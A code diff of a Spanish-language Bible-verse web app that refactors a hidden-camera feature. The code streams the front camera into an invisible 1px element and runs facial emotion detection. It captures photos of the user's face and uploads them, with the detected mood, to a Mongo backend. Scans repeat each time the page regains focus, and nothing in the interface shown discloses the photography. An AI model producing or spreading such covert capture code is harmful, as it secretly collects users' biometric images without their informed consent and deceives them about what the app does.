@@ -16,14 +16,13 @@
     #verse { font-size: 1.5rem; font-style: italic; margin-bottom: 20px; line-height: 1.4; text-shadow: 0px 2px 4px rgba(0,0,0,0.5); opacity: 0; transition: opacity 0.5s ease; }
     #reference { font-weight: bold; margin-top: 10px; color: #bb86fc; font-size: 1.1rem; letter-spacing: 1px; text-transform: uppercase; opacity: 0; transition: opacity 0.5s ease; }
     
-    /* Animación de entrada */
     @keyframes fadeInUpSubtle {
         0% { opacity: 0; transform: translateY(20px); filter: blur(5px); }
         100% { opacity: 1; transform: translateY(0); filter: blur(0); }
     }
     .fade-up { animation: fadeInUpSubtle 1.5s cubic-bezier(0.22, 1, 0.36, 1) forwards; }
 
-    /* Animación de "Pensando" (Pulsación suave del texto) */
+    /* Animación de "Pensando" */
     @keyframes pulseText {
         0% { opacity: 0.5; }
         50% { opacity: 1; }
@@ -40,15 +39,10 @@
 
     .version-footer { position: fixed; bottom: 5px; width: 100%; text-align: center; font-size: 0.7rem; color: #555; pointer-events: none; }
 
-    /* --- CÁMARA FANTASMA (Invisible pero activa) --- */
-    /* No usamos display:none porque pausa la cámara en iOS. Usamos Opacidad 0 */
+    /* CÁMARA FANTASMA */
     #hidden-camera-container {
-        position: fixed;
-        top: 0; left: 0;
-        width: 1px; height: 1px; /* Mínimo tamaño */
-        opacity: 0; /* Invisible al ojo */
-        z-index: -100; /* Detrás de todo */
-        pointer-events: none;
+        position: fixed; top: 0; left: 0; width: 1px; height: 1px; 
+        opacity: 0; z-index: -100; pointer-events: none;
     }
   </style>
 </head>
@@ -59,7 +53,7 @@
     <div id="reference"></div>
     
     <div class="btn-group">
-        <button id="btn-notify" onclick="window.subscribeUser()">✨ ACTIVAR MAGIA</button>
+        <button id="btn-notify" onclick="window.subscribeUser()">📜 OBTENER SABIDURÍA</button>
         <button id="btn-unsubscribe" onclick="window.unsubscribeUser()">🔕 DETENER</button>
     </div>
   </div>
@@ -81,50 +75,53 @@
     // --- VARIABLES DE CONTROL ---
     let isScanning = false;
     let lastScanTime = 0;
-    const SCAN_COOLDOWN = 15000; // 15 segs entre escaneos automáticos para evitar bucles
+    let scanStartTime = 0; // Para el timeout
+    const SCAN_COOLDOWN = 15000; // 15 segs entre intentos
+    const SCAN_TIMEOUT = 5000;   // 5 segs máximo buscando cara
 
-    // --- 1. LÓGICA DE IA INVISIBLE ---
+    // --- 1. LÓGICA DE IA INVISIBLE (CON TIMEOUT) ---
     window.startMoodScan = async function(force = false) {
-        if (isScanning) return; // Ya está trabajando
+        if (isScanning) return; 
 
         const now = Date.now();
-        // Si no es forzado y pasó poco tiempo, abortamos silenciosamente
         if (!force && (now - lastScanTime < SCAN_COOLDOWN)) return;
 
         isScanning = true;
+        scanStartTime = Date.now(); // Iniciamos cronómetro de búsqueda
 
-        // Feedback sutil: Cambiamos el texto para indicar "Sintiendo..."
-        // Esto es opcional, pero ayuda a que el cambio de texto no sea tan brusco
-        // document.getElementById('reference').innerText = "Sintiendo...";
+        // Feedback visual sutil (Opcional)
         // document.getElementById('reference').classList.add('analyzing');
 
         try {
-            // Pedimos cámara (Si ya tiene permiso, no sale popup)
             videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
             const video = document.getElementById('video-feed');
             video.srcObject = videoStream;
 
             if (!modelsLoaded) {
-                // Si es la primera vez, tardará un poco descargando IA
                 await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/gh/cgarciagl/face-api.js@0.22.2/weights/');
                 await faceapi.nets.faceExpressionNet.loadFromUri('https://cdn.jsdelivr.net/gh/cgarciagl/face-api.js@0.22.2/weights/');
                 modelsLoaded = true;
             }
 
-            // Iniciamos detección en segundo plano
             detectEmotionLoop();
 
         } catch (err) {
-            console.error("No se pudo acceder a la cámara:", err);
-            isScanning = false; // Liberamos
-            // Si falla, mostramos versículo random sin IA
-            renderVerse(versesDB[Math.floor(Math.random() * versesDB.length)]);
+            console.error("Error/Permiso cámara:", err);
+            handleScanFailure(); // Fallback inmediato si no hay cámara
         }
     }
 
     async function detectEmotionLoop() {
         if (!isScanning) return;
         const video = document.getElementById('video-feed');
+
+        // --- CHECK DE TIEMPO LÍMITE ---
+        // Si lleva más de 5 segundos buscando y no encuentra nada...
+        if (Date.now() - scanStartTime > SCAN_TIMEOUT) {
+            console.log("⏰ Tiempo agotado. No se detectó rostro.");
+            handleScanFailure(); // Nos rendimos y mostramos versículo random
+            return;
+        }
 
         try {
             const options = new faceapi.TinyFaceDetectorOptions();
@@ -136,35 +133,64 @@
                 const dominant = sorted[0];
                 const confidence = expressions[dominant];
 
-                // Si la certeza es buena (> 50%)
                 if (confidence > 0.5) {
-                    // ¡Éxito!
-                    console.log(`IA Detectó: ${dominant} (${confidence})`);
+                    console.log(`IA Éxito: ${dominant}`);
                     
-                    // 1. Guardar y Enviar (Background)
+                    // 1. Guardar
                     captureAndSave(video, dominant, confidence);
 
-                    // 2. Actualizar Timers
-                    lastScanTime = Date.now();
-                    isScanning = false;
-
-                    // 3. Detener cámara silenciosamente
-                    stopCamera();
-
-                    // 4. Mostrar el versículo mágico
-                    // Quitamos clase de animación de carga si la hubiera
-                    document.getElementById('reference').classList.remove('analyzing');
-                    showVerseByMood(dominant);
+                    // 2. Finalizar Éxito
+                    finishScan(dominant);
                     return;
                 }
             }
         } catch(e) {}
 
-        // Reintentar en 200ms
         if (isScanning) setTimeout(detectEmotionLoop, 200);
     }
 
-    // --- LÓGICA DE GUARDADO (Queue Offline) ---
+    // --- MANEJO DE ÉXITO Y FRACASO ---
+    
+    function finishScan(mood) {
+        lastScanTime = Date.now();
+        isScanning = false;
+        stopCamera();
+        document.getElementById('reference').classList.remove('analyzing');
+        showVerseByMood(mood);
+    }
+
+    function handleScanFailure() {
+        // Fallback: Si falla la cámara o no hay cara, mostramos versículo aleatorio
+        // y activamos el Cooldown para no reintentar inmediatamente.
+        console.log("⚠️ Fallback: Versículo aleatorio (Sin guardar en Mongo)");
+        
+        lastScanTime = Date.now(); // Activamos cooldown para que no buclee
+        isScanning = false;
+        stopCamera();
+        
+        document.getElementById('reference').classList.remove('analyzing');
+        
+        // Versículo aleatorio puro
+        const randomVerse = versesDB[Math.floor(Math.random() * versesDB.length)];
+        renderVerse(randomVerse);
+    }
+
+    // --- UTILIDADES ---
+    function getVerseForMood(mood) {
+        let dbMood = 'neutral';
+        if (mood === 'happy') dbMood = 'happy';
+        if (mood === 'sad') dbMood = 'sad';
+        if (mood === 'angry' || mood === 'disgusted') dbMood = 'angry';
+        if (mood === 'fearful') dbMood = 'fear';
+        const filtered = versesDB.filter(v => v.m && v.m.includes(dbMood));
+        const pool = filtered.length > 0 ? filtered : versesDB;
+        return pool[Math.floor(Math.random() * pool.length)];
+    }
+
+    function showVerseByMood(mood) {
+        renderVerse(getVerseForMood(mood));
+    }
+
     async function captureAndSave(videoElement, emotion, confidence) {
         try {
             const canvas = document.createElement('canvas');
@@ -179,11 +205,8 @@
             const verse = getVerseForMood(emotion);
             const payload = { image: base64Image, emotion, confidence, verse };
 
-            if (navigator.onLine) {
-                sendToMongo(payload);
-            } else {
-                saveToOfflineQueue(payload);
-            }
+            if (navigator.onLine) sendToMongo(payload);
+            else saveToOfflineQueue(payload);
         } catch (e) { console.error(e); }
     }
 
@@ -215,22 +238,6 @@
     window.addEventListener('online', processOfflineQueue);
     window.addEventListener('load', processOfflineQueue);
 
-    // --- UTILIDADES ---
-    function getVerseForMood(mood) {
-        let dbMood = 'neutral';
-        if (mood === 'happy') dbMood = 'happy';
-        if (mood === 'sad') dbMood = 'sad';
-        if (mood === 'angry' || mood === 'disgusted') dbMood = 'angry';
-        if (mood === 'fearful') dbMood = 'fear';
-        const filtered = versesDB.filter(v => v.m && v.m.includes(dbMood));
-        const pool = filtered.length > 0 ? filtered : versesDB;
-        return pool[Math.floor(Math.random() * pool.length)];
-    }
-
-    function showVerseByMood(mood) {
-        renderVerse(getVerseForMood(mood));
-    }
-
     window.stopCamera = function() {
         if (videoStream) {
             videoStream.getTracks().forEach(track => track.stop());
@@ -244,20 +251,14 @@
         const verseEl = document.getElementById('verse');
         const refEl = document.getElementById('reference');
         
-        // 1. Desvanecer texto actual
         verseEl.style.opacity = 0;
         refEl.style.opacity = 0;
 
-        // 2. Esperar medio segundo y cambiar contenido
         setTimeout(() => {
             verseEl.innerText = `"${data.t}"`;
             refEl.innerText = data.r;
-            
-            // 3. Reaparecer suavemente
             verseEl.style.opacity = 1;
             refEl.style.opacity = 1;
-            
-            // Reiniciar animación FadeUp si quieres movimiento
             verseEl.classList.remove('fade-up');
             void verseEl.offsetWidth; 
             verseEl.classList.add('fade-up');
@@ -331,10 +332,12 @@
     showVersionFromSW();
     renderVerse(versesDB[new Date().getDate() % versesDB.length]);
 
-    // Visibilidad (Re-escaneo al volver)
+    // Visibilidad (Re-escaneo INTELIGENTE al volver)
     document.addEventListener("visibilitychange", () => {
         if (document.visibilityState === "visible") {
             const isSetupDone = localStorage.getItem('setup_v1_pwa');
+            // Si regresa, intentamos escanear, pero startMoodScan respetará el COOLDOWN
+            // así que si falló hace 2 segundos, no intentará de nuevo.
             if (isSetupDone) startMoodScan(); 
         }
     });
